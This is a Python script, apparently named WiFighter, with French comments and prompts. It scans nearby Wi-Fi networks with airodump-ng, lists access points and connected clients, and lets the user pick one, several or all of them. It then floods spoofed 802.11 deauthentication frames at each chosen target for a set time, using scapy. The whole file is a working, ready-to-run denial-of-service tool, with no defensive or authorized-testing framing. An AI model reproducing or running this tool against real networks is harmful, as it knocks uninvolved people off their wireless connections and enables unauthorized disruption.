 #!/usr/bin/env python3

import subprocess
import time
import os
import signal
import csv
import glob as glob_module
from threading import Thread
from scapy.all import *

SCAN_FILE_PREFIX = "wifighter_scan"

# === Couleurs terminal ===
RED = "\033[91m"
YELLOW_BOLD = "\033[1;93m"
RESET = "\033[0m"

# === Affichage de la bannière ===
def banner():
    os.system("clear")
    print(f"""{RED}
 __      __.___  _____.__       .__     __                
/  \    /  \   |/ ____\__| ____ |  |___/  |_  ___________ 
\   \/\/   /   \   __\|  |/ ___\|  |  \   __\/ __ \_  __ \\
 \        /|   ||  |  |  / /_/  >   Y  \  | \  ___/|  | \/
  \__/\  / |___||__|  |__\___  /|___|  /__|  \___  >__|   
       \/               /_____/      \/          \/   
{YELLOW_BOLD}
            >>> WiFighter — Deauth Tool by H8Laws <<<
{RESET}""")

# === Nettoyer les anciens fichiers de scan ===
def clean_scan_files():
    for file in glob_module.glob(f"{SCAN_FILE_PREFIX}-*.csv"):
        try:
            os.remove(file)
        except Exception as e:
            print(f"[-] Erreur suppression {file} : {e}")

# === Récupérer les interfaces Wi-Fi ===
def get_interfaces():
    result = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
    interfaces = []
    for line in result.splitlines():
        if "IEEE 802.11" in line:
            iface = line.split()[0]
            interfaces.append(iface)
    return interfaces

# === Passer en mode monitor ===
def enable_monitor_mode(interface):
    if interface.endswith("mon"):
        subprocess.run(["airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        interface = interface[:-3]

    print(f"[+] Activation du mode monitor sur {interface}...")
    subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Détection automatique du nom de l'interface monitor
    result = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
    mon_iface = None
    for line in result.splitlines():
        if "Mode:Monitor" in line:
            mon_iface = line.split()[0]
            break

    if mon_iface:
        print(f"[+] Interface monitor détectée : {mon_iface}")
        return mon_iface
    else:
        print("[-] Impossible de détecter l'interface monitor ! Utilisation de l'interface originale.")
        return interface


# === Revenir en mode normal ===
def disable_monitor_mode(mon_iface):
    if mon_iface.endswith("mon"):
        print(f"[+] Désactivation du mode monitor sur {mon_iface}...")
        subprocess.run(["airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# === Lancer le scan airodump ===
def run_airodump(interface):
    clean_scan_files()
    print("[+] Scan en cours... (Ctrl+C pour arrêter)")
    proc = subprocess.Popen([
        "airodump-ng", "-w", SCAN_FILE_PREFIX,
        "--output-format", "csv", interface
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return proc

# === Lire les résultats du scan (APs + clients) ===
def parse_scan_results(filename):
    aps = []
    clients = {}
    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        section = 0
        for row in reader:
            if len(row) < 1:
                continue
            if row[0].startswith("BSSID"):
                section = 1
                continue
            elif row[0].startswith("Station MAC"):
                section = 2
                continue

            if section == 1 and len(row) > 13:
                essid = row[13].strip()
                if essid == "":
                    continue
                bssid = row[0].strip()
                aps.append({
                    "bssid": bssid,
                    "channel": row[3].strip(),
                    "essid": essid,
                    "power": row[8].strip()
                })
                clients[bssid] = []
            elif section == 2 and len(row) > 5:
                client_mac = row[0].strip()
                ap_mac = row[5].strip()
                if ap_mac in clients:
                    clients[ap_mac].append(client_mac)
    return aps, clients

# === Affichage de la liste des réseaux ===
def print_ap_list(aps):
    print("\n   NUM     ESSID                CH   PWR     BSSID")
    print("  ----  -------------------  ----  ----  -------------------")
    for i, ap in enumerate(aps):
        print(f"   {i+1:<2}   {ap['essid']:<20}  {ap['channel']:<4}  {ap['power']:<4}  {ap['bssid']}")

# === Changer de canal ===
def set_channel(interface, channel):
    subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# === Lancer l'attaque DEAUTH (broadcast + clients) ===
def deauth_attack(ap_mac, channel, interface, duration=90, clients=None):
    print(f"[+] Lancement de l'attaque DEAUTH sur {ap_mac} (CH {channel}) pendant {duration}s...")
    set_channel(interface, channel)

    packets = []
    pkt_broadcast = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    packets.append(pkt_broadcast)

    if clients:
        for client_mac in clients:
            pkt_to_client = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
            pkt_to_ap = RadioTap() / Dot11(addr1=ap_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=7)
            packets.extend([pkt_to_client, pkt_to_ap])

    def send_loop():
        end = time.time() + duration
        while time.time() < end:
            for pkt in packets:
                sendp(pkt, iface=interface, verbose=0)
            time.sleep(0.1)

    thread = Thread(target=send_loop)
    thread.start()
    thread.join()
    print("[+] Fin de l'attaque.")

# === Fonction principale ===
def main():
    while True:
        banner()
        interfaces = get_interfaces()
        if not interfaces:
            print("[-] Aucune interface Wi-Fi détectée.")
            return

        print("[+] Interfaces disponibles :")
        for i, iface in enumerate(interfaces):
            print(f"  {i}. {iface}")

        try:
            choice = int(input("[?] Choisis l'index de l'interface : "))
            iface = interfaces[choice]
        except:
            print("[-] Choix invalide.")
            continue

        mon_iface = enable_monitor_mode(iface)
        proc = run_airodump(mon_iface)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            proc.send_signal(signal.SIGINT)
            time.sleep(2)

        csv_file = f"{SCAN_FILE_PREFIX}-01.csv"
        if not os.path.exists(csv_file):
            print("[-] Aucun fichier de scan trouvé.")
            disable_monitor_mode(mon_iface)
            continue

        aps, all_clients = parse_scan_results(csv_file)
        if not aps:
            print("[-] Aucun point d'accès détecté.")
            disable_monitor_mode(mon_iface)
            continue

        print_ap_list(aps)
        selection = input("\n[+] Sélectionne une cible (ex: 1 ou 1,3 ou all) : ").strip()
        targets = []
        if selection.lower() == "all":
            targets = aps
        else:
            parts = selection.split(",")
            for part in parts:
                if part.isdigit():
                    idx = int(part) - 1
                    if 0 <= idx < len(aps):
                        targets.append(aps[idx])

        for ap in targets:
            clients = all_clients.get(ap["bssid"], [])
            deauth_attack(ap["bssid"], ap["channel"], mon_iface, duration=60, clients=clients)

        disable_monitor_mode(mon_iface)
        again = input("\n[?] Relancer un scan ? (y/n) : ").strip().lower()
        if again != "y":
            break

if __name__ == "__main__":
    main()
